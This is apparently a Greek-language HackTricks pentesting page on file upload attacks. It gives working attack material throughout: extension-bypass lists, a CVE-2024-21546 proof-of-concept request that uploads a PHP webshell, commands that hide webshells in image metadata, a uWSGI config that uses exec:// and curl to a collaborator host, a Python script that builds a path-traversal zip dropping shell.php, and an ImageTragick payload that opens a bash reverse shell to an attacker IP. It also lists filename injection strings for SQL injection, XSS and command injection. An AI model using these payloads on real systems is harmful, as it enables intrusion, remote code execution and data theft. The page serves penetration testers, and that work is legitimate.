# Μεταφόρτωση Αρχείων

{{#include ../../banners/hacktricks-training.md}}

## Γενική Μεθοδολογία Μεταφόρτωσης Αρχείων

Άλλες χρήσιμες επεκτάσεις:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Εργασία σε PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Παράκαμψη ελέγχων επεκτάσεων αρχείων

1. Εάν ισχύουν, **ελέγξτε** τις **προηγούμενες επεκτάσεις.** Δοκιμάστε τις επίσης χρησιμοποιώντας μερικά **κεφαλαία γράμματα**: _pHp, .pHP5, .PhAr ..._
2. _Ελέγξτε **προσθήκη έγκυρης επέκτασης πριν** την επέκταση εκτέλεσης (χρησιμοποιήστε και τις προηγούμενες επεκτάσεις):_
- _file.png.php_
- _file.png.Php5_
3. Προσπαθήστε να προσθέσετε **ειδικούς χαρακτήρες στο τέλος.** Μπορείτε να χρησιμοποιήσετε το Burp για να **bruteforce** όλους τους χαρακτήρες **ascii** και **Unicode**. (_Σημείωση: μπορείτε επίσης να δοκιμάσετε να χρησιμοποιήσετε τις **προηγουμένως** αναφερθείσες **επεκτάσεις**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Προσπαθήστε να παρακάμψετε τις προστασίες **ξεγελώντας τον parser επεκτάσεων** στην πλευρά του server με τεχνικές όπως **διπλασιασμός** της **επέκτασης** ή **προσθήκη σκουπιδιών** (bytes **null**) ανάμεσα στις επεκτάσεις. _Μπορείτε επίσης να χρησιμοποιήσετε τις **προηγούμενες επεκτάσεις** για να προετοιμάσετε καλύτερο payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Προσθέστε **ένα ακόμη επίπεδο επεκτάσεων** στο προηγούμενο έλεγχο:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Δοκιμάστε να τοποθετήσετε την **επέκταση εκτέλεσης πριν την έγκυρη επέκταση** και ελπίζετε ότι ο διακομιστής είναι λανθασμένα διαμορφωμένος. (χρήσιμο για εκμετάλλευση λανθασμένων ρυθμίσεων Apache όπου οτιδήποτε με επέκταση .php — αλλά όχι απαραίτητα τελειώνοντας σε .php — θα εκτελεί κώδικα):
- _ex: file.php.png_
7. Χρήση **NTFS alternate data stream (ADS)** σε **Windows**. Σε αυτή την περίπτωση, θα εισαχθεί χαρακτήρας ":" μετά από μια απαγορευμένη επέκταση και πριν από μια επιτρεπτή. Ως αποτέλεσμα, θα δημιουργηθεί ένα **κενό αρχείο με την απαγορευμένη επέκταση** στον server (π.χ. "file.asax:.jpg”). Αυτό το αρχείο μπορεί να επεξεργαστεί αργότερα με άλλες τεχνικές όπως η χρήση του short filename. Το "**::$data**” pattern μπορεί επίσης να χρησιμοποιηθεί για να δημιουργήσει μη κενά αρχεία. Επομένως, η προσθήκη ενός χαρακτήρα τελείας μετά από αυτό το pattern μπορεί επίσης να είναι χρήσιμη για παράκαμψη περαιτέρω περιορισμών (π.χ. "file.asp::$data.”)
8. Προσπαθήστε να σπάσετε τα όρια μήκους ονόματος αρχείου. Η έγκυρη επέκταση κόβεται. Και το κακόβουλο PHP μένει. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Κάποιοι handlers ανέβασματος περικόπτουν ή κανονικοποιούν τους τελικούς χαρακτήρες τελείας από το αποθηκευμένο όνομα αρχείου. Στο UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) σε εκδόσεις πριν την 2.9.1, μπορείτε να παρακάμψετε την επικύρωση επεκτάσεων με:

- Χρήση έγκυρου image MIME και magic header (π.χ. PNG’s `\x89PNG\r\n\x1a\n`).
- Ονομάζοντας το ανεβασμένο αρχείο με επέκταση PHP ακολουθούμενη από τελεία, π.χ. `shell.php.`.
- Ο server αφαιρεί την τελική τελεία και αποθηκεύει το `shell.php`, το οποίο θα εκτελεστεί αν τοποθετηθεί σε φάκελο που σερβίρεται από τον web server (προεπιλεγμένος public storage όπως `/storage/files/`).

Ελάχιστο PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Στη συνέχεια προσπελάστε το αποθηκευμένο μονοπάτι (τυπικό σε Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Αναβαθμίστε το unisharp/laravel-filemanager σε ≥ 2.9.1.
- Εφαρμόστε αυστηρές server-side allowlists και επικυρώστε ξανά το persisted filename.
- Σερβίρετε τα uploads από μη-εκτελέσιμες τοποθεσίες.

### Παράκαμψη Content-Type, Magic Number, Compression & Resizing

- Παρακάμψτε τους ελέγχους **Content-Type** ορίζοντας την **τιμή** της **επικεφαλίδας** **Content-Type** σε: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Παρακάμψτε τον έλεγχο **magic number** προσθέτοντας στην αρχή του αρχείου τα **bytes ενός πραγματικού image** (να μπερδέψετε την εντολή _file_). Ή εισάγετε το shell μέσα στα **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ή μπορείτε επίσης να **εισάγετε το payload απευθείας** σε μια εικόνα:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Αν **προστίθεται συμπίεση στην εικόνα σας**, για παράδειγμα χρησιμοποιώντας κάποιες standard PHP βιβλιοθήκες όπως [PHP-GD](https://www.php.net/manual/fr/book.image.php), οι προηγούμενες τεχνικές μπορεί να μην είναι χρήσιμες. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κάποιο κείμενο που **επιβιώνει της συμπίεσης**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Η web σελίδα μπορεί επίσης να **αλλάζει το μέγεθος** της **εικόνας**, χρησιμοποιώντας για παράδειγμα τις συναρτήσεις PHP-GD `imagecopyresized` ή `imagecopyresampled`. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κάποιο κείμενο που **επιβιώνει της συμπίεσης**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Άλλη τεχνική για να φτιάξετε ένα payload που **επιβιώνει της αλλαγής μεγέθους εικόνας**, χρησιμοποιώντας τη συνάρτηση PHP-GD `thumbnailImage`. Επίσης, μπορείτε να χρησιμοποιήσετε το **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κάποιο κείμενο που **επιβιώνει της συμπίεσης**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Άλλα κόλπα για έλεγχο

- Βρείτε ευπάθεια για να **μετονομάσετε** το αρχείο που έχει ήδη ανέβει (για να αλλάξετε την επέκταση).
- Βρείτε ευπάθεια **Local File Inclusion** για να εκτελέσετε το backdoor.
- **Πιθανή αποκάλυψη πληροφοριών**:
1. Κάντε upload **πολλές φορές** (και ταυτόχρονα) το **ίδιο αρχείο** με το **ίδιο όνομα**
2. Ανεβάστε ένα αρχείο με το **όνομα** ενός **αρχείου** ή **φακέλου** που **υπάρχει ήδη**
3. Ανέβασμα αρχείου με **"." , "..", ή "..." ως όνομα**. Για παράδειγμα, σε Apache σε **Windows**, αν η εφαρμογή αποθηκεύει τα ανεβασμένα αρχεία στο "/www/uploads/" directory, το "." filename θα δημιουργήσει ένα αρχείο που ονομάζεται "uploads" στο "/www/" directory.
4. Ανεβάστε ένα αρχείο που μπορεί να μην διαγραφεί εύκολα όπως **"…:.jpg”** σε **NTFS**. (Windows)
5. Ανεβάστε ένα αρχείο σε **Windows** με **μη έγκυρους χαρακτήρες** όπως `|<>*?”` στο όνομά του. (Windows)
6. Ανεβάστε ένα αρχείο σε **Windows** χρησιμοποιώντας **reserved** (**forbidden**) **names** όπως CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, και LPT9.
- Δοκιμάστε επίσης να **ανεβάσετε ένα εκτελέσιμο** (.exe) ή ένα **.html** (λιγότερο ύποπτο) που **θα εκτελέσει κώδικα** όταν ανοίξει κατά λάθος από το θύμα.

### Ειδικά κόλπα επεκτάσεων

Αν προσπαθείτε να ανεβάσετε αρχεία σε έναν **PHP server**, [ρίξτε μια ματιά στο **.htaccess** trick για εκτέλεση κώδικα](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Αν προσπαθείτε να ανεβάσετε αρχεία σε έναν **ASP server**, [ρίξτε μια ματιά στο **.config** trick για εκτέλεση κώδικα](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Τα αρχεία `.phar` είναι σαν τα `.jar` για java, αλλά για php, και μπορούν να **χρησιμοποιηθούν σαν php αρχείο** (εκτέλεση με php, ή include μέσα σε ένα script...).

Η επέκταση `.inc` χρησιμοποιείται μερικές φορές για php αρχεία που είναι μόνο για **import files**, οπότε κάπου μπορεί να έχει επιτραπεί η **εκτέλεση αυτής της επέκτασης**.

## **Jetty RCE**

Αν μπορείτε να ανεβάσετε ένα XML αρχείο σε έναν Jetty server μπορείτε να αποκτήσετε [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Έτσι, όπως αναφέρεται στην παρακάτω εικόνα, ανεβάστε το XML αρχείο στο `$JETTY_BASE/webapps/` και περιμένετε το shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Για λεπτομερή διερεύνηση αυτής της ευπάθειας δείτε την πρωτότυπη έρευνα: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Οι ευπάθειες Remote Command Execution (RCE) μπορούν να εκμεταλλευτούν σε uWSGI servers αν κάποιος έχει τη δυνατότητα να τροποποιήσει το `.ini` configuration file. Τα αρχεία ρυθμίσεων uWSGI χρησιμοποιούν μια συγκεκριμένη σύνταξη για να ενσωματώσουν "magic" variables, placeholders και operators. Σημειωτέον, ο operator '@', που χρησιμοποιείται ως `@(filename)`, έχει σχεδιαστεί για να περιλαμβάνει τα περιεχόμενα ενός αρχείου. Μεταξύ των διαφόρων υποστηριζόμενων schemes στο uWSGI, το scheme "exec" είναι ιδιαίτερα ισχυρό, επιτρέποντας την ανάγνωση δεδομένων από το standard output μιας διεργασίας. Αυτή η δυνατότητα μπορεί να χειραγωγηθεί για κακόβουλους σκοπούς όπως Remote Command Execution ή Arbitrary File Write/Read όταν ένα `.ini` configuration file υποβάλλεται σε επεξεργασία.

Σκεφτείτε το ακόλουθο παράδειγμα ενός κακόβουλου `uwsgi.ini` αρχείου, που παρουσιάζει διάφορα schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Η εκτέλεση του payload συμβαίνει κατά τη διάρκεια της ανάλυσης του αρχείου ρυθμίσεων. Για να ενεργοποιηθεί και να αναλυθεί η ρύθμιση, η διαδικασία uWSGI πρέπει είτε να επανεκκινηθεί (πιθανώς μετά από ένα crash ή λόγω μιας επίθεσης Denial of Service) είτε το αρχείο πρέπει να έχει οριστεί σε auto-reload. Η δυνατότητα auto-reload, αν είναι ενεργοποιημένη, ξαναφορτώνει το αρχείο σε καθορισμένα διαστήματα όταν ανιχνεύει αλλαγές.

Είναι κρίσιμο να κατανοήσετε τη χαλαρή φύση του parsing των αρχείων ρυθμίσεων του uWSGI. Συγκεκριμένα, το συζητούμενο payload μπορεί να εισαχθεί σε ένα binary αρχείο (όπως μια εικόνα ή PDF), διευρύνοντας περαιτέρω το πεδίο πιθανής εκμετάλλευσης.

## **wget File Upload/SSRF Trick**

Σε ορισμένες περιπτώσεις μπορεί να διαπιστώσετε ότι ένας server χρησιμοποιεί **`wget`** για να **κατεβάσει αρχεία** και μπορείτε να **υποδείξετε** το **URL**. Σε αυτές τις περιπτώσεις, ο κώδικας μπορεί να ελέγχει ότι η επέκταση των ληφθέντων αρχείων βρίσκεται σε μια whitelist για να διασφαλίσει ότι μόνο επιτρεπόμενα αρχεία θα κατέβουν. Ωστόσο, **αυτός ο έλεγχος μπορεί να παρακαμφθεί.**\
Το **μέγιστο** μήκος ενός **ονόματος αρχείου** σε **linux** είναι **255**, ωστόσο, **wget** περικόπτει τα ονόματα αρχείων στα **236** χαρακτήρες. Μπορείτε να **κατεβάσετε ένα αρχείο με όνομα "A"\*232+".php"+".gif"**, αυτό το όνομα θα **παρακάμψει** τον **έλεγχο** (όπως σε αυτό το παράδειγμα **".gif"** είναι μια **έγκυρη** επέκταση) αλλά `wget` θα **μετονομάσει** το αρχείο σε **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Σημειώστε ότι **μια άλλη επιλογή** που ίσως σκέφτεστε για να παρακάμψετε αυτόν τον έλεγχο είναι να κάνετε τον **HTTP server redirect to a different file**, έτσι το αρχικό URL θα παρακάμψει τον έλεγχο και έπειτα το wget θα κατεβάσει το ανακατευθυνόμενο αρχείο με το νέο όνομα. Αυτό **δεν θα λειτουργήσει** **εκτός εάν** το wget χρησιμοποιείται με την **παράμετρο** `--trust-server-names` επειδή **το wget θα κατεβάσει τη σελίδα προώθησης με το όνομα του αρχείου που αναφέρεται στο αρχικό URL**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) είναι ένα ισχυρό εργαλείο σχεδιασμένο να βοηθά Pentesters και Bug Hunters στη δοκιμή μηχανισμών file upload. Χρησιμοποιεί διάφορες bug bounty techniques για να απλοποιήσει τη διαδικασία εντοπισμού και εκμετάλλευσης ευπαθειών, διασφαλίζοντας πλήρεις αξιολογήσεις web εφαρμογών.

### Corrupting upload indices with snprintf quirks (historical)

Κάποιοι παλαιότεροι upload handlers που χρησιμοποιούν `snprintf()` ή παρόμοια για να φτιάξουν πίνακες multi-file από ένα single-file upload μπορούν να ξεγελαστούν ώστε να πλαστογραφήσουν τη δομή `_FILES`. Εξαιτίας ασυνέπειας και αποκοπής στη συμπεριφορά του `snprintf()`, ένα προσεκτικά κατασκευασμένο single upload μπορεί να εμφανιστεί ως πολλαπλά αρχεία με δείκτες στην πλευρά του server, μπερδεύοντας λογικές που υποθέτουν αυστηρή δομή (π.χ. αντιμετώπιση ως multi-file upload και εκτέλεση μη ασφαλών κλάδων). Αν και σπάνιο σήμερα, αυτό το μοτίβο «index corruption» εμφανίζεται περιστασιακά σε CTFs και παλαιότερα codebases.

## From File upload to other vulnerabilities

- Ορίστε την **filename** σε `../../../tmp/lol.png` και δοκιμάστε να επιτύχετε **path traversal**
- Ορίστε την **filename** σε `sleep(10)-- -.jpg` και ίσως καταφέρετε **SQL injection**
- Ορίστε την **filename** σε `<svg onload=alert(document.domain)>` για να επιτύχετε XSS
- Ορίστε την **filename** σε `; sleep 10;` για να δοκιμάσετε κάποιο command injection (περισσότερα [command injections tricks εδώ](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Δοκιμάστε **different svg payloads** από [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Αν μπορείτε να **υποδείξετε στον web server να πάρει μια εικόνα από ένα URL** μπορείτε να προσπαθήσετε να καταχραστείτε ένα [SSRF](../ssrf-server-side-request-forgery/index.html). Αν αυτή η **image** πρόκειται να **saved** σε κάποιο **public** site, μπορείτε επίσης να υποδείξετε ένα URL από [https://iplogger.org/invisible/](https://iplogger.org/invisible/) και να **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Ειδικά διαμορφωμένα PDFs για XSS: Η [επόμενη σελίδα παρουσιάζει πώς να **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Αν μπορείτε να ανεβάσετε PDFs θα μπορούσατε να προετοιμάσετε ένα PDF που θα εκτελέσει αυθαίρετο JS ακολουθώντας τις δοθείσες οδηγίες.
- Ανεβάστε το περιεχόμενο του \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) για να ελέγξετε αν ο server έχει κάποιο **antivirus**
- Ελέγξτε αν υπάρχει κάποιο **size limit** κατά το ανέβασμα αρχείων

Ακολουθεί μια top 10 λίστα πραγμάτων που μπορείτε να πετύχετε ανεβάζοντας αρχεία (από [εδώ](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Ανατρέξτε στο [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) για άλλους τύπους αρχείων.

## Zip/Tar File Automatically decompressed Upload

Αν μπορείτε να ανεβάσετε ένα ZIP που θα αποσυμπιεστεί μέσα στον server, μπορείτε να κάνετε 2 πράγματα:

### Symlink

Ανεβάστε ένα archive που περιέχει soft links (symbolic links) προς άλλα αρχεία, και στη συνέχεια, προσπελάζοντας τα αποσυμπιεσμένα αρχεία θα προσπελάσετε τα συνδεδεμένα αρχεία:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Αποσυμπίεση σε διαφορετικούς φακέλους

Η απροσδόκητη δημιουργία αρχείων σε καταλόγους κατά τη διάρκεια της αποσυμπίεσης αποτελεί σημαντικό πρόβλημα. Παρά τις αρχικές υποθέσεις ότι αυτή η ρύθμιση μπορεί να προστατεύει από OS-level command execution μέσω κακόβουλων μεταφορτώσεων αρχείων, η υποστήριξη ιεραρχικής συμπίεσης και οι δυνατότητες directory traversal του ZIP archive format μπορούν να εκμεταλλευτούν. Αυτό επιτρέπει σε επιτιθέμενους να παρακάμψουν περιορισμούς και να διαφύγουν από ασφαλείς καταλόγους ανεβάσματος, χειραγωγώντας τη λειτουργία αποσυμπίεσης της στοχευμένης εφαρμογής.

Ένας αυτοματοποιημένος exploit για τη δημιουργία τέτοιων αρχείων είναι διαθέσιμος στο [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Το εργαλείο μπορεί να χρησιμοποιηθεί όπως φαίνεται:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Επιπλέον, το **symlink trick with evilarc** είναι μια επιλογή. Αν ο στόχος είναι να στοχευθεί ένα αρχείο όπως το `/flag.txt`, θα πρέπει να δημιουργηθεί ένα symlink προς αυτό το αρχείο στο σύστημά σας. Αυτό εξασφαλίζει ότι το evilarc δεν θα αντιμετωπίσει σφάλματα κατά τη λειτουργία του.

Παρακάτω είναι ένα παράδειγμα κώδικα Python που χρησιμοποιείται για να δημιουργήσει ένα κακόβουλο zip αρχείο:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Κατάχρηση συμπίεσης για file spraying**

Για περισσότερες λεπτομέρειες **δείτε το αρχικό άρθρο στο**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Δημιουργία PHP Shell**: Γράφεται PHP κώδικας για την εκτέλεση εντολών που περνάνε μέσω της μεταβλητής `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying και Δημιουργία Συμπιεσμένου Αρχείου**: Δημιουργούνται πολλαπλά αρχεία και συναρμολογείται ένα zip αρχείο που περιέχει αυτά τα αρχεία.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Τροποποίηση με Hex Editor ή vi**: Τα ονόματα των αρχείων μέσα στο zip τροποποιούνται χρησιμοποιώντας vi ή έναν hex editor, αλλάζοντας "xxA" σε "../" για να περιηγηθεί σε φακέλους.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Ανεβάστε αυτό το περιεχόμενο με επέκταση εικόνας για να εκμεταλλευτείτε την ευπάθεια **(ImageMagick , 7.0.1-1)** (από το [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ενσωμάτωση PHP Shell σε PNG

Η ενσωμάτωση ενός PHP shell στο IDAT chunk ενός αρχείου PNG μπορεί να παρακάμψει αποτελεσματικά ορισμένες λειτουργίες επεξεργασίας εικόνας. Οι συναρτήσεις `imagecopyresized` και `imagecopyresampled` από το PHP-GD είναι ιδιαίτερα σχετικές σε αυτό το πλαίσιο, καθώς χρησιμοποιούνται συνήθως για αλλαγή μεγέθους και resampling εικόνων, αντίστοιχα. Η ικανότητα του ενσωματωμένου PHP shell να παραμένει ανεπηρέαστο από αυτές τις λειτουργίες αποτελεί σημαντικό πλεονέκτημα για ορισμένες χρήσεις.

Μια αναλυτική διερεύνηση αυτής της τεχνικής, συμπεριλαμβανομένης της μεθοδολογίας και των πιθανών εφαρμογών, παρέχεται στο ακόλουθο άρθρο: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Αυτός ο πόρος προσφέρει μια ολοκληρωμένη κατανόηση της διαδικασίας και των επιπτώσεών της.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Τα Polyglot Files λειτουργούν ως μοναδικό εργαλείο στην ασφάλεια, ενεργώντας σαν χαμαιλέοντες που μπορούν έγκυρα να υπάρχουν σε πολλαπλές μορφές αρχείων ταυτόχρονα. Ένα ενδιαφέρον παράδειγμα είναι το [GIFAR](https://en.wikipedia.org/wiki/Gifar), ένα υβρίδιο που λειτουργεί και ως GIF και ως RAR archive. Τέτοια αρχεία δεν περιορίζονται σε αυτό το ζεύγος· συνδυασμοί όπως GIF και JS ή PPT και JS είναι επίσης εφικτοί.

